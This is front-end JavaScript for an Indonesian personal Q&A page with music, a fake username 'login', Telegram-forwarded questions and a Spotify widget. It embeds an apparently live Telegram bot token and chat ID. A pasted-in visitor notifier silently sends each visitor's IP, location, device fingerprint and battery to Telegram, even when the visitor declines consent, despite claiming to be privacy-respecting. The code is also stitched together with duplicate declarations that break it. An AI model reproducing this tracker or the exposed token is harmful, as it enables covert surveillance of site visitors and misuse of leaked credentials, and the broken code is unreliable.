﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
if (openPhotoOptions && photoOptions) {
  openPhotoOptions.addEventListener('click', () => {
    photoOptions.classList.toggle('show');
  });
}

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

// pastikan audio bisa dimulai hanya setelah interaksi nyata
async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (err) {
    console.log("Autoplay gagal:", err);
    btnMusic.classList.add("show");
  }
}

// Deteksi platform mobile
const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);

// PC: boleh langsung trigger setelah klik/touch pertama
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

// tombol utama tetap jadi pemicu manual (aman di mobile)
btnMusic.addEventListener('click', async () => {
  try {
    await music.play();
    music.muted = false;
    started = true;
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (e) {
    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
    console.log(e);
  }
});

// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
if (isMobile) {
  btnMusic.classList.add("show");
  music.muted = true;
} else {
  setTimeout(() => { startMusic(); }, 800);
}

// === MODAL PERTANYAAN ===
const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

// === LOGIN INSTAGRAM ===
const overlay = document.getElementById("blurOverlay"),
  input = document.getElementById("igInput"),
  btnLogin = document.getElementById("igSubmit"),
  savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) {
  removeOverlay();
  showUserStatus(savedIG);
}
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(() => {});
      } catch (e) {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// === KIRIM PERTANYAAN + FOTO ===
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const photo = document.getElementById('qphoto').files[0];
  const qmsg = document.getElementById('qmsg');

  if (!text && !photo) {
    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
    return;
  }

  qmsg.textContent = "Mengirim...";

  if (photo) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
    fd.append("photo", photo);
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
      if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
      else qmsg.textContent = "💔 Gagal mengirim foto.";
    } catch {
      qmsg.textContent = "😿 Gagal koneksi.";
    }
  } else if (text) {
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
      qmsg
    );
  }

  setTimeout(() => {
    if (qmsg.textContent.includes("Terkirim")) {
      modal.classList.remove('show');
      document.getElementById('qtext').value = "";
      document.getElementById('qphoto').value = "";
    }
  }, 1000);
});

// GACOR+ Visitor Notifier (privacy-respecting)
// Cara pakai: set BOT_TOKEN dan CHAT_IDS (array) di bagian CONFIG.
// Fitur utama:
// - Consent modal (opt-in) sebelum mengumpulkan data sensitif
// - Kumpulkan data teknis non-sensitive yang tersedia di browser
// - GPS jika user mengizinkan (HighAccuracy) — hanya dikirim bila user memberikan izin
// - Auto-retry dengan exponential backoff jika pengiriman gagal
// - Dedupe lokal (hindari kirim berulang dalam dedupeMinutes)
// - Kirim ke banyak chat_id (CHAT_IDS array)
// - Minimal fallback jika user menolak consent (kirim notifikasi anonim)
// PENTING: Gunakan hanya jika pengguna sudah memberi CONSENT eksplisit.

const BOT_TOKEN = "GANTI_DENGAN_BOT_TOKEN";
const CHAT_IDS = ["CHAT_ID_1", /* "CHAT_ID_2", */]; // array, bisa kirim ke beberapa chat
const DEDUPE_MINUTES = 10; // tidak mengirim ulang untuk user yang sama dalam X menit
const RETRY_MAX = 5; // maksimal percobaan retry pengiriman
const DEDUPE_KEY = "gacor_last_sent"; // localStorage key

/* ----------------- helper UI: consent modal ----------------- */
function showConsentModal() {
  return new Promise(resolve => {
    // jika sudah ada keputusan sebelumnya, gunakan itu
    const prev = localStorage.getItem('gacor_consent');
    if (prev === 'granted') return resolve(true);
    if (prev === 'denied') return resolve(false);

    // buat modal sederhana
    const modal = document.createElement('div');
    modal.id = 'gacor-consent';
    modal.style = `
      position:fixed; left:0; top:0; right:0; bottom:0;
      display:flex; align-items:center; justify-content:center;
      background: rgba(0,0,0,0.6); z-index:99999; font-family:Arial, sans-serif;
    `;
    modal.innerHTML = `
      <div style="background:#fff; padding:18px; border-radius:8px; max-width:420px; width:92%; box-shadow:0 6px 24px rgba(0,0,0,.25);">
        <h3 style="margin:0 0 8px 0">Izinkan Pengumpulan Data?</h3>
        <p style="margin:0 0 12px 0; color:#444; font-size:14px">
          Untuk meningkatkan laporan pengunjung (GACOR+), kami meminta izin mengumpulkan data teknis:
          lokasi (GPS), informasi perangkat & koneksi, dan durasi kunjungan. Data tidak akan dijual.
        </p>
        <div style="display:flex; gap:8px; justify-content:flex-end;">
          <button id="gacor-deny" style="padding:8px 12px; border-radius:6px; border:1px solid #ddd; background:#fff;">Tolak</button>
          <button id="gacor-allow" style="padding:8px 12px; border-radius:6px; border:0; background:#2563eb; color:#fff;">Setuju & Kirim</button>
        </div>
        <p style="margin-top:8px; font-size:12px; color:#666">Kamu bisa mengubah preferensi ini dari localStorage (gacor_consent).</p>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById('gacor-allow').onclick = () => {
      localStorage.setItem('gacor_consent','granted'); modal.remove(); resolve(true);
    };
    document.getElementById('gacor-deny').onclick = () => {
      localStorage.setItem('gacor_consent','denied'); modal.remove(); resolve(false);
    };

    // auto-resolve false after 30s to avoid blocking UI indefinitely (tapi simpan 'denied')
    setTimeout(() => {
      if (document.getElementById('gacor-consent')) {
        localStorage.setItem('gacor_consent','denied'); modal.remove(); resolve(false);
      }
    }, 30000);
  });
}

/* ----------------- utils ----------------- */
function humanNow() {
  return new Date().toLocaleString('id-ID');
}
function safeFetchJson(url, opts) {
  return fetch(url, opts).then(r => r.json()).catch(()=>null);
}
function shortUA() {
  // very small UA parsing to get browser name+version
  const ua = navigator.userAgent;
  const map = [
    [/Edge\/([0-9\.]+)/, 'Edge'],
    [/Edg\/([0-9\.]+)/, 'Edge'],
    [/OPR\/([0-9\.]+)/, 'Opera'],
    [/Chrome\/([0-9\.]+)/, 'Chrome'],
    [/Firefox\/([0-9\.]+)/, 'Firefox'],
    [/Safari\/([0-9\.]+)/, 'Safari'],
  ];
  for (const [re, name] of map) {
    const m = ua.match(re);
    if (m) return `${name} ${m[1]}`;
  }
  return navigator.userAgent;
}
function getDedupeMarker() {
  try { return JSON.parse(localStorage.getItem(DEDUPE_KEY) || '{}'); } catch(e){ return {}; }
}
function setDedupeMarker(marker) {
  try { localStorage.setItem(DEDUPE_KEY, JSON.stringify(marker)); } catch(e) {}
}

/* ----------------- Build data payload ----------------- */
async function buildVisitorData({includeSensitive=false, gps=null, gpsAccuracy=null}) {
  // Basic info
  const now = new Date();
  const screen = window.screen || {};
  const nav = navigator || {};
  const perf = performance || {};
  const languages = nav.languages ? nav.languages.join(', ') : (nav.language || '');
  let ipInfo = null;
  try {
    // ipwho.is is allowed public API — fallback safe
    ipInfo = await safeFetchJson('https://ipwho.is/');
  } catch(e) { ipInfo = null; }

  // Battery (may throw on some browsers)
  let batteryString = "unknown";
  try {
    if (nav.getBattery) {
      const b = await nav.getBattery();
      batteryString = `${Math.round(b.level * 100)}% (${b.charging ? "⚡" : "🔋"})`;
    }
  } catch(e){}

  // device memory & hardware concurrency (may be undefined)
  const deviceMemory = nav.deviceMemory || "unknown";
  const hwConcurrency = nav.hardwareConcurrency || "unknown";

  // connection info
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  const connection = {
    effectiveType: conn.effectiveType || "unknown",
    downlink: conn.downlink || "unknown",
    rtt: conn.rtt || "unknown",
    saveData: conn.saveData || false,
  };

  // timezone & locale
  let timezone = "unknown";
  try {
    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezone;
  } catch(e){}

  // performance timing (page load ms)
  let perfTiming = {};
  try {
    if (performance && performance.timing) {
      perfTiming = {
        navigationStart: performance.timing.navigationStart || 0,
        loadEventEnd: performance.timing.loadEventEnd || 0,
        domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd || 0,
      };
    }
  } catch(e){}

  const payload = {
    when: now.toISOString(),
    when_human: humanNow(),
    user_name_local: localStorage.getItem('ig_user') || 'Anonim',
    ip: ipInfo?.ip || 'unknown',
    ip_org: ipInfo?.org || ipInfo?.connection?.isp || 'unknown',
    country: ipInfo?.country || ipInfo?.country_name || 'unknown',
    region: ipInfo?.region || ipInfo?.regionName || 'unknown',
    city: ipInfo?.city || 'unknown',
    browser: shortUA(),
    userAgent: navigator.userAgent,
    languages,
    timezone,
    screen: {
      width: screen.width || 'unknown',
      height: screen.height || 'unknown',
      availWidth: screen.availWidth || 'unknown',
      availHeight: screen.availHeight || 'unknown',
      colorDepth: screen.colorDepth || 'unknown',
      orientation: screen.orientation ? screen.orientation.type : (screen.width > screen.height ? 'landscape' : 'portrait')
    },
    deviceMemory,
    hardwareConcurrency: hwConcurrency,
    connection,
    battery: batteryString,
    performance: perfTiming,
    page_url: location.href,
    page_title: document.title,
    referrer: document.referrer || '',
    consent: includeSensitive ? 'granted' : 'denied',
    gps: gps ? { latitude: gps.latitude, longitude: gps.longitude, accuracy: gpsAccuracy } : null,
    // runtime metrics that can be updated later
    visit_duration_seconds: 0,
  };

  return payload;
}

/* ----------------- Telegram sender with retry + multi-chat ----------------- */
async function sendTelegramMessage(text, extra = {}, attempt = 0) {
  // Send sequentially to each chat id. Each chat get its own request.
  const results = [];
  for (const CHAT_ID of CHAT_IDS) {
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    let ok = false;
    let err = null;
    // retry loop per chat
    for (let i = 0; i <= RETRY_MAX; i++) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        });
        const j = await res.json();
        if (j && j.ok) { ok = true; break; }
        else { err = j; }
      } catch (e) { err = e; }
      // exponential backoff
      const wait = Math.min(2000 * Math.pow(2, i), 20000);
      await new Promise(r => setTimeout(r, wait));
    }
    results.push({ chat: CHAT_ID, ok, err });
  }
  return results;
}

/* ----------------- Compose telegram text from payload (readable) ----------------- */
function composeTelegramText(payload) {
  // Make a tidy HTML message (Telegram parse_mode=HTML)
  const gpsLine = payload.gps ? `📍 <a href="https://www.google.com/maps?q=${payload.gps.latitude},${payload.gps.longitude}&z=17">Lokasi (GPS) ±${payload.gps.accuracy}m</a>` : `📍 Lokasi: Tidak tersedia`;
  const ipLine = `🛰️ IP: ${payload.ip} — ${payload.ip_org}`;
  const screen = payload.screen;
  const conn = payload.connection;
  const lines = [
    `📢 <b>Pengunjung Baru (GACOR+)</b>`,
    `👤 Nama lokal: ${escapeHtml(payload.user_name_local)}`,
    `🏷️ Lokasi: ${escapeHtml(payload.city)}, ${escapeHtml(payload.region)}, ${escapeHtml(payload.country)}`,
    gpsLine,
    ipLine,
    `🕓 Waktu: ${payload.when_human}`,
    `🌐 Zona/Wilayah: ${escapeHtml(payload.timezone)} — Bahasa: ${escapeHtml(payload.languages)}`,
    `💻 Device: ${escapeHtml(payload.browser)}`,
    `🔧 UA: <code>${escapeHtml(shortString(payload.userAgent, 240))}</code>`,
    `🖥️ Layar: ${screen.width}x${screen.height} (${screen.orientation}) — colorDepth:${screen.colorDepth}`,
    `⚙️ Memori: ${payload.deviceMemory}GB — CPU cores: ${payload.hardwareConcurrency}`,
    `📡 Koneksi: ${conn.effectiveType} — downlink:${conn.downlink}Mbps — rtt:${conn.rtt}ms — saveData:${conn.saveData}`,
    `🔋 Baterai: ${payload.battery}`,
    `⏱️ Durasi kunjungan: ${Math.round((payload.visit_duration_seconds||0))} detik`,
    `📄 Halaman: ${escapeHtml(payload.page_title)} — ${escapeHtml(payload.page_url)}`,
    `🔗 Referrer: ${escapeHtml(payload.referrer || '-')}`,
    ``,
    `<i>Consent: ${payload.consent}</i>`
  ];
  return lines.join('\n');
}

function escapeHtml(str) {
  if (!str && str !== 0) return '';
  return String(str).replace(/[&<>"']/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[ch]));
}
function shortString(s, len) { return s && s.length > len ? s.slice(0,len-3)+'...' : s; }

/* ----------------- main routine ----------------- */
async function showVisitorInfoGacorPlus() {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) {
    console.warn('GACOR+: BOT_TOKEN atau CHAT_IDS belum diset. Aborting.');
    return;
  }

  // dedupe: jika sudah dikirim untuk pengunjung ini dalam X menit -> skip
  const dedupe = getDedupeMarker();
  const lastSentTs = dedupe.ts || 0;
  const sinceMin = (Date.now() - lastSentTs) / 60000;
  if (sinceMin < DEDUPE_MINUTES) {
    console.log(`GACOR+: Dedupe aktif — tidak mengirim (last ${Math.round(sinceMin)} menit lalu).`);
    return;
  }

  const consent = await showConsentModal();

  // try to get GPS only if consent given
  let gps = null, gpsAcc = null;
  if (consent && navigator.geolocation) {
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:8000, maximumAge:0 });
      });
      gps = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
      gpsAcc = Math.round(pos.coords.accuracy || 0);
    } catch(e) {
      // user might deny or timeout — ignore silently
      console.log('GACOR+: GPS tidak tersedia atau ditolak.');
    }
  }

  // build payload
  const payload = await buildVisitorData({ includeSensitive: !!consent, gps, gpsAccuracy: gpsAcc });

  // track visit duration until unload (update message if needed)
  let visitStart = Date.now();
  function updateDuration() {
    payload.visit_duration_seconds = (Date.now() - visitStart)/1000;
  }
  // periodically update visit duration in memory
  const durInterval = setInterval(updateDuration, 1000);

  // Compose message and send
  const text = composeTelegramText(payload);
  try {
    const sendResult = await sendTelegramMessage(text, payload);
    console.log('GACOR+: sendResult', sendResult);
    // update dedupe marker
    setDedupeMarker({ ts: Date.now(), ip: payload.ip });
  } catch(e) {
    console.error('GACOR+: Gagal kirim pesan', e);
  }

  // on page unload, optionally send a short "left" message with duration (best-effort, no retry)
  window.addEventListener('beforeunload', () => {
    clearInterval(durInterval);
    updateDuration();
    try {
      const leaveText = `🚪 Pengunjung meninggalkan halaman\n👤 ${escapeHtml(payload.user_name_local)}\n⏱ Durasi: ${Math.round(payload.visit_duration_seconds)} detik\n🕓 ${humanNow()}`;
      // navigator.sendBeacon for best-effort background send
      const beaconData = new Blob([JSON.stringify({ chat_ids: CHAT_IDS, text: leaveText })], { type: 'application/json' });
      // We will POST to a small relay endpoint if you host one; fallback: call Telegram API directly with sendMessage for each chat (not recommended on unload)
      for (const CHAT_ID of CHAT_IDS) {
        try {
          navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(leaveText)}`);
        } catch(e) {
          // ignore
        }
      }
    } catch(e){}
  });
}

/* ----------------- run ----------------- */
showVisitorInfoGacorPlus();

// === EFEK BUTTERFLY 💸 ===
(function () {
  const area = document.querySelector('.card');
  const butterflies = [];
  const butterflyCount = 7;
  let holdActive = false;
  let holdX = 0;
  let holdY = 0;
  let cachedRect = area.getBoundingClientRect();

  window.addEventListener('resize', () => {
    cachedRect = area.getBoundingClientRect();
  });

  area.style.position = 'relative';
  area.style.overflow = 'hidden';

  function getBounds() {
    return {
      width: area.clientWidth,
      height: area.clientHeight,
      left: cachedRect.left,
      top: cachedRect.top
    };
  }

  const bounds = getBounds();
  for (let i = 0; i < butterflyCount; i++) {
    const b = document.createElement('div');
    b.className = 'butterfly';
    b.textContent = '💸';
    area.appendChild(b);
    butterflies.push({
      el: b,
      x: Math.random() * bounds.width,
      y: Math.random() * bounds.height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      size: 16 + Math.random() * 10,
      flapOffset: Math.random() * Math.PI * 2
    });
    b.style.fontSize = butterflies[i].size + 'px';
  }

  function moveButterflies() {
    const rect = getBounds();
    const time = performance.now() / 200;

    butterflies.forEach(b => {
      b.vy += 0.002;
      if (holdActive) {
        const dx = holdX - b.x;
        const dy = holdY - b.y;
        b.vx += dx * 0.002;
        b.vy += dy * 0.002;
      }
      b.vx += Math.sin(time + b.flapOffset) * 0.04;
      b.vy += Math.cos(time + b.flapOffset) * 0.02;
      b.x += b.vx;
      b.y += b.vy;

      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));

      const flap = Math.sin(time * 8 + b.flapOffset) * 20;

      b.el.style.transform = `
        translate(${b.x}px, ${b.y}px)
        rotate(${flap}deg)
        scale(${1 + Math.sin(time * 4 + b.flapOffset) * 0.05})
      `;
    });

    requestAnimationFrame(moveButterflies);
  }
  moveButterflies();

  let pendingMove = null;
  function updateHold() {
    if (pendingMove && holdActive) {
      holdX = pendingMove.x - cachedRect.left;
      holdY = pendingMove.y - cachedRect.top;
      pendingMove = null;
    }
    requestAnimationFrame(updateHold);
  }
  updateHold();

  const startHold = (x, y) => {
    holdActive = true;
    holdX = x - cachedRect.left;
    holdY = y - cachedRect.top;
  };
  const endHold = () => (holdActive = false);

  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
  area.addEventListener('mouseup', endHold);
  area.addEventListener('mouseleave', endHold);
  area.addEventListener('mousemove', e => {
    pendingMove = { x: e.clientX, y: e.clientY };
  });

  area.addEventListener('touchstart', e => {
    const t = e.touches[0];
    startHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchmove', e => {
    const t = e.touches[0];
    pendingMove = { x: t.clientX, y: t.clientY };
  });
  area.addEventListener('touchend', endHold);
  area.addEventListener('touchcancel', endHold);
})();

// === LIVE STATUS + SPOTIFY ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    text-align:center;
    font-size:14px;
    font-family:'Poppins', monospace;
    color:#cfcfcf;
    margin-top:6px;
    opacity:0;
    transition:opacity .6s ease;
  `;
  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data = await res.json();
      const text = `${data.status}`;
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000);
})();

(async function(){
  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
  const liveStatus = document.getElementById("liveModeStatus");
  if (!liveStatus) return;

  const spotifyBox = document.createElement("div");
  spotifyBox.id = "spotifyPreviewBox";
  spotifyBox.style.cssText = `
    width:100%;
    max-width:280px;
    margin:10px auto;
    text-align:center;
    position:relative;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    transition:opacity .4s ease, transform .3s ease;
    opacity:0;
    transform:scale(0.98);
  `;

  const coverWrap = document.createElement("div");
  coverWrap.style.cssText = `
    position:relative;
    width:100%;
    height:100px;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 0 18px rgba(76,201,255,0.25);
  `;

  const cover = document.createElement("img");
  cover.id = "spotifyPreviewCover";
  cover.style.cssText = `
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
    transition:transform .25s ease, box-shadow .3s ease;
  `;

  const progressBar = document.createElement("div");
  progressBar.style.cssText = `
    position:absolute;
    bottom:0;
    left:0;
    height:4px;
    width:0%;
    background:linear-gradient(90deg,#4cc9ff,#b5179e);
    transition:width .4s linear;
    border-bottom-left-radius:12px;
    border-bottom-right-radius:12px;
  `;

  coverWrap.appendChild(cover);
  coverWrap.appendChild(progressBar);

  liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
  spotifyBox.appendChild(coverWrap);
  spotifyBox.appendChild(liveStatus);

  async function updateSpotify(){
    try{
      const res = await fetch(API_URL,{cache:"no-store"});
      const data = await res.json();
      if(data.cover){
        cover.src = data.cover;
        cover.style.display = "block";
      } else {
        cover.style.display = "none";
      }

      if(data.progress_ms && data.duration_ms){
        const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
        progressBar.style.width = percent + "%";
      } else {
        progressBar.style.width = "0%";
      }

      spotifyBox.style.opacity = 1;
      spotifyBox.style.transform = "scale(1)";
    }catch(e){
      console.warn("Spotify preview error:", e);
    }
  }

  updateSpotify();
  setInterval(updateSpotify, 8000);
})();
